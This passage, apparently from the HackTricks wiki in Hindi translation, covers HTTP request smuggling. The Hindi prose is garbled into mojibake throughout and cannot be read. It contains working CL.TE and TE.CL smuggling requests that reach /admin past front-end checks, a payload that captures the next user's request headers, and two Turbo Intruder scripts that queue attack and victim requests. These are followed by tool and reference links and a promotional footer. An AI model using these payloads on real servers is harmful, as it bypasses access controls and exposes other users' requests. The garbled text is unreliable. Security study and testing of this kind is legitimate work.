* "рд╣рдорд▓рд╛" рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рдФрд░ "рд╕рд╛рдорд╛рдиреНрдп" рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рдХреЛ рдЬрд┐рддрдирд╛ рд╕рдВрднрд╡ рд╣реЛ рд╕рдХреЗ, рд╡реЗ рдПрдХ рд╣реА рдпреВрдЖрд░рдПрд▓ рдФрд░ рдкреИрд░рд╛рдореАрдЯрд░ рдирд╛рдореЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдПред рдЗрд╕рд▓рд┐рдП рдХрд┐ рдХрдИ рдЖрдзреБрдирд┐рдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреНрд╕ рдпреВрдЖрд░рдПрд▓ рдФрд░ рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдлреНрд░рдВрдЯ-рдПрдВрдб рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рдХреЛ рд╡рд┐рднрд┐рдиреНрди рдмреИрдХ-рдПрдВрдб рд╕рд░реНрд╡рд░реНрд╕ рдХреА рдУрд░ рдорд╛рд░реНрдЧрд╛рдиреБрдХреНрд░рдорд┐рдд рдХрд░рддреЗ рд╣реИрдВред рдПрдХ рд╣реА рдпреВрдЖрд░рдПрд▓ рдФрд░ рдкреИрд░рд╛рдореАрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рд╕реЗ рдпрд╣ рд╕рдВрднрд╛рд╡рдирд╛ рдмрдврд╝ рдЬрд╛рддреА рд╣реИ рдХрд┐ рд░рд┐рдХреНрд╡реЗрд╕реНрдЯреНрд╕ рдПрдХ рд╣реА рдмреИрдХ-рдПрдВрдб рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рд╕рдВрд╕реНрдХреГрдд рдХрд┐рдП рдЬрд╛рдПрдВрдЧреЗ, рдЬреЛ рд╣рдорд▓реЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╣реИред
* "рд╣рдорд▓рд╛" рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рд╕реЗ рдХрд┐рд╕реА рдЕрдиреНрдп рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рдХреЗ рд╣рд╕реНрддрдХреНрд╖реЗрдк рдХреЛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП "рд╕рд╛рдорд╛рдиреНрдп" рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рдХрд╛ рдкрд░реАрдХреНрд╖рдг рдХрд░рддреЗ рд╕рдордп рдЖрдк рдЙрд╕ рд╕рдордп рдХреЗ рд╕рд╛рде рдПрдХ рджреМрдбрд╝ рдореЗрдВ рд╣реИрдВ рдЬрд┐рд╕ рд╕рдордп рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдПрдХ рд╕рд╛рде рдкреНрд░рд╛рдкреНрдд рдХрд░ рд░рд╣рд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рднреА рд╢рд╛рдорд┐рд▓ рд╣реИрдВред рдЖрдкрдХреЛ "рд╕рд╛рдорд╛рдиреНрдп" рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рдХреЛ "рд╣рдорд▓рд╛" рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рдХреЗ рддреБрд░рдВрдд рдмрд╛рдж рднреЗрдЬрдирд╛ рдЪрд╛рд╣рд┐рдПред рдпрджрд┐ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╡реНрдпрд╕реНрдд рд╣реИ, рддреЛ рдЖрдкрдХреЛ рд╡рд▓рдирд░реЗрдмрд┐рд▓рд┐рдЯреА рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрдИ рдкреНрд░рдпрд╛рд╕ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛ рд╕рдХрддреА рд╣реИред
* рдХреБрдЫ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ, рдлреНрд░рдВрдЯ-рдПрдВрдб рд╕рд░реНрд╡рд░ рдПрдХ рд▓реЛрдб рдмреИрд▓реЗрдВрд╕рд░ рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рд░реНрдп рдХрд░рддрд╛ рд╣реИ, рдФрд░ рдХреБрдЫ рд▓реЛрдб рдмреИрд▓реЗрдВрд╕рд┐рдВрдЧ рдПрд▓реНрдЧреЛрд░рд┐рджрдо рдХреЗ рдЕрдиреБрд╕рд╛рд░ рд╡рд┐рднрд┐рдиреНрди рдмреИрдХ-рдПрдВрдб рд╕рд┐рд╕реНрдЯрдореНрд╕ рдХреЛ рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рдлреЙрд░рд╡рд░реНрдб рдХрд░рддрд╛ рд╣реИред рдпрджрд┐ рдЖрдкрдХреА "рд╣рдорд▓рд╛" рдФрд░ "рд╕рд╛рдорд╛рдиреНрдп" рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рд╡рд┐рднрд┐рдиреНрди рдмреИрдХ-рдПрдВрдб рд╕рд┐рд╕реНрдЯрдореНрд╕ рдХреЛ рдлреЙрд░рд╡рд░реНрдб рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ, рддреЛ рд╣рдорд▓рд╛ рдЕрд╕рдлрд▓ рд╣реЛ рдЬрд╛рдПрдЧрд╛ред рдпрд╣ рдПрдХ рдЕрддрд┐рд░рд┐рдХреНрдд рдХрд╛рд░рдг рд╣реИ рдХрд┐ рд╡рд▓рдирд░реЗрдмрд┐рд▓рд┐рдЯреА рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рдХрдИ рдмрд╛рд░ рдкреНрд░рдпрд╛рд╕ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛ рд╕рдХрддреА рд╣реИред
* рдпрджрд┐ рдЖрдкрдХрд╛ рд╣рдорд▓рд╛ рдХрд┐рд╕реА рднрд╡рд┐рд╖реНрдп рдХреЗ рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рдореЗрдВ рд╣рд╕реНрддрдХреНрд╖реЗрдк рдХрд░рдиреЗ рдореЗрдВ рд╕рдлрд▓ рд╣реЛрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣ "рд╕рд╛рдорд╛рдиреНрдп" рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рдирд╣реАрдВ рдерд╛ рдЬрд┐рд╕реЗ рдЖрдкрдиреЗ рд╣рд╕реНрддрдХреНрд╖реЗрдк рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рднреЗрдЬрд╛ рдерд╛, рддреЛ рдЗрд╕рдХрд╛ рдЕрд░реНрде рд╣реИ рдХрд┐ рдХрд┐рд╕реА рдЕрдиреНрдп рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдЖрдкрдХреЗ рд╣рдорд▓реЗ рдХрд╛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред рдпрджрд┐ рдЖрдк рдкрд░реАрдХреНрд╖рдг рдЬрд╛рд░реА рд░рдЦрддреЗ рд╣реИрдВ, рддреЛ рдЗрд╕рд╕реЗ рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдкрд░ рдкреНрд░рднрд╛рд╡ рдкрдбрд╝ рд╕рдХрддрд╛ рд╣реИ, рдФрд░ рдЖрдкрдХреЛ рд╕рд╛рд╡рдзрд╛рдиреА рдмрд░рддрдиреА рдЪрд╛рд╣рд┐рдПред

### рд╣реЙрдк-рдмрд╛рдп-рд╣реЙрдк рд╣реЗрдбрд░реНрд╕ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЬрдмрд░рджрд╕реНрддреА

рд╣реЙрдк-рдмрд╛рдп-рд╣реЙрдк рд╣реЗрдбрд░реНрд╕ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк рдкреНрд░реЙрдХреНрд╕реА рдХреЛ рд╕рдВрдХреЗрддрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ **рд╣реЗрдбрд░ Content-Length рдпрд╛ Transfer-Encoding рдХреЛ рд╣рдЯрд╛рдПрдВ рддрд╛рдХрд┐ рдПрдХ рдПрдЪрдЯреАрдЯреАрдкреА рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рд╕реНрдордЧреНрд▓рд┐рдВрдЧ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ**ред
```
Connection: Content-Length
```
## HTTP рдЕрдиреБрд░реЛрдз рд╕реНрдордЧреНрд▓рд┐рдВрдЧ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ

### рдлреНрд░рдВрдЯ-рдПрдВрдб рд╕реБрд░рдХреНрд╖рд╛ рдирд┐рдпрдВрддреНрд░рдг рдХреЛ рдЫрд▓рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП

рдХрднреА-рдХрднреА **рдлреНрд░рдВрдЯ-рдПрдВрдб рдкреНрд░реЙрдХреНрд╕реА рд╕реБрд░рдХреНрд╖рд╛ рдЬрд╛рдВрдЪреЗрдВ рдХрд░реЗрдЧреА**ред рдЖрдк HTTP рдЕрдиреБрд░реЛрдз рд╕реНрдордЧреНрд▓рд┐рдВрдЧ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЗрдиреНрд╣реЗрдВ рдЫрд▓ рд╕рдХрддреЗ рд╣реИрдВ рдХреНрдпреЛрдВрдХрд┐ рдЖрдк **рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрд╛рдпреЛрдВ рдХреЛ рдЫрд▓ рд╕рдХрддреЗ рд╣реИрдВ**ред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рдЖрдк **рдмрд╛рд╣рд░ рд╕реЗ `/admin` рддрдХ рдкрд╣реБрдВрдЪ рдирд╣реАрдВ рд╕рдХрддреЗ** рдФрд░ рдлреНрд░рдВрдЯ-рдПрдВрдб рдкреНрд░реЙрдХреНрд╕реА рдпрд╣ рдЬрд╛рдВрдЪ рд░рд╣реА рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣ **рдкреНрд░реЙрдХреНрд╕реА рдПрдореНрдмреЗрдбреЗрдб рдЕрдиреБрд░реЛрдз рдХреА рдЬрд╛рдВрдЪ рдирд╣реАрдВ рдХрд░ рд░рд╣реА рд╣реИ**:

**CL.TE**

`POST / HTTP/1.1`\
`Host: acb21fdd1f98c4f180c02944000100b5.web-security-academy.net`\
`Cookie: session=xht3rUYoc83NfuZkuAp8sDxzf0AZIwQr`\
`Connection: keep-alive`\
`Content-Type: application/x-www-form-urlencoded`\
`Content-Length: 67`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /admin HTTP/1.1`\
`Host: localhost`\
`Content-Length: 10`\
\`\`\
`x=`

**TE.CL**

`POST / HTTP/1.1`\
`Host: ace71f491f52696180f41ed100d000d4.web-security-academy.net`\
`Cookie: session=Dpll5XYw4hNEu09dGccoTjHlFNx5QY1c`\
`Content-Type: application/x-www-form-urlencoded`\
`Connection: keep-alive`\
`Content-Length: 4`\
`Transfer-Encoding: chunked`\
`2b`\
`GET /admin HTTP/1.1`\
`Host: localhost`\
`a=x`\
`0`\
`\`

### рдлреНрд░рдВрдЯ-рдПрдВрдб рдЕрдиреБрд░реЛрдз рдкреБрдирд░реНрд▓реЗрдЦрди рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдирд╛

рдХрдИ рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреЛрдВ рдореЗрдВ **рдлреНрд░рдВрдЯ-рдПрдВрдб рд╕рд░реНрд╡рд░ рдЕрдиреБрд░реЛрдзреЛрдВ рдХрд╛ рдкреБрдирд░реНрд▓реЗрдЦрди рдХрд░рддрд╛ рд╣реИ** рдкрд╣рд▓реЗ рд╡реЗ рдмреИрдХ-рдПрдВрдб рд╕рд░реНрд╡рд░ рдХреЛ рдлреЙрд░рд╡рд░реНрдб рдХрд░рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ, рд╕рд╛рдорд╛рдиреНрдпрдд: рдХреБрдЫ рдЕрддрд┐рд░рд┐рдХреНрдд рдЕрдиреБрд░реЛрдз рд╣реЗрдбрд░ рдЬреЛрдбрд╝рдХрд░ред\
рдПрдХ рд╕рд╛рдорд╛рдиреНрдп рдЪреАрдЬ рдпрд╣ рд╣реИ рдХрд┐ рдЕрдиреБрд░реЛрдз рдореЗрдВ рд╢реАрд░реНрд╖рдХ рдЬреЛрдбрд╝рдирд╛ рд╣реИ `X-Forwarded-For: <рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдЖрдИрдкреА>` рдпрд╛ рдХреЛрдИ рд╕рдорд╛рди рд╣реЗрдбрд░ рддрд╛рдХрд┐ рдмреИрдХ-рдПрдВрдб рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдЖрдИрдкреА рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХреЗред\
рдХрднреА-рдХрднреА, рдпрджрд┐ рдЖрдк **рдЦреЛрдЬ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдирдП рдорд╛рди рдХреМрди рд╕реЗ рдЬреЛрдбрд╝реЗ рдЧрдП рд╣реИрдВ** рддреЛ рдЖрдк рд╕рдВрд░рдХреНрд╖рдг рдХреЛ **рдЫрд▓ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ **рдЫреБрдкреА рдЬрд╛рдирдХрд╛рд░реА**/**рдЕрдВрдд рдмрд┐рдВрджреБ** рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВред

рдЕрдиреБрд░реЛрдз рдХреЛ рдкреБрдирд░реНрд▓реЗрдЦрди рдХреИрд╕реЗ рдХрд░ рд░рд╣рд╛ рд╣реИ рдкреНрд░реЙрдХреНрд╕реА рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ **рдПрдХ рдкреЛрд╕реНрдЯ рдкреИрд░рд╛рдореАрдЯрд░ рдЦреЛрдЬрдирд╛ рд╣реЛрдЧрд╛ рдЬрд┐рд╕рдХрд╛ рдорд╛рди рдмреИрдХ-рдПрдВрдб рдЙрддреНрддрд░ рдореЗрдВ рдкреНрд░рддрд┐рдмрд┐рдВрдмрд┐рдд рд╣реЛрдЧрд╛**ред рдлрд┐рд░, рдЗрд╕ рдкреИрд░рд╛рдореАрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдЕрдВрддрд┐рдо рдХрд░реЗрдВ рдФрд░ рдЗрд╕ рддрд░рд╣ рдХрд╛ рдПрдХ рдЙрддреНрдкреАрдбрд╝рди рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ:

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 130`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
`0`\
``\ `POST /search HTTP/1.1`\ `Host: vulnerable-website.com`\ `Content-Type: application/x-www-form-urlencoded`\ `Content-Length: 100`\``\
`search=`

рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдЕрдЧрд▓рд╛ рдЕрдиреБрд░реЛрдз `search=` рдХреЗ рдмрд╛рдж рдЬреЛрдбрд╝рд╛ рдЬрд╛рдПрдЧрд╛ рдЬреЛ **рдЙрддреНрддрд░ рдкрд░ рдкреНрд░рддрд┐рдмрд┐рдВрдмрд┐рдд рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ рдкреИрд░рд╛рдореАрдЯрд░** рд╣реИ, рдЗрд╕рд▓рд┐рдП рдпрд╣ **рдЕрдЧрд▓реЗ рдЕрдиреБрд░реЛрдз рдХреЗ рд╣реЗрдбрд░ рдкреНрд░рддрд┐рдмрд┐рдВрдмрд┐рдд рдХрд░реЗрдЧрд╛**ред
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### рдЯреАрдИ.рд╕реА.рдПрд▓

From: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА

![рдпрд╣рд╛рдБ рд╕реЗ рдЫрд╡рд┐ред](https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104)

[рдпрд╣рд╛рдБ рд╕реЗ рдЫрд╡рд┐ред](https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104)

## рдЙрдкрдХрд░рдг

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): рдпрд╣ рдЙрдкрдХрд░рдг рд╡рд┐рдЪрд┐рддреНрд░ рдЕрдиреБрд░реЛрдз рд╕реНрдордЧрд▓рд┐рдВрдЧ рдЕрдВрддрд░ рдХреА рдЦреЛрдЬ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реИред

## рд╕рдВрджрд░реНрдн

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдФрд░ рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХреНрд▓рд╛рдЙрдб рдЧрд┐рдЯрд╣рдм рд░реЗрдкреЛ рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗред

</details>
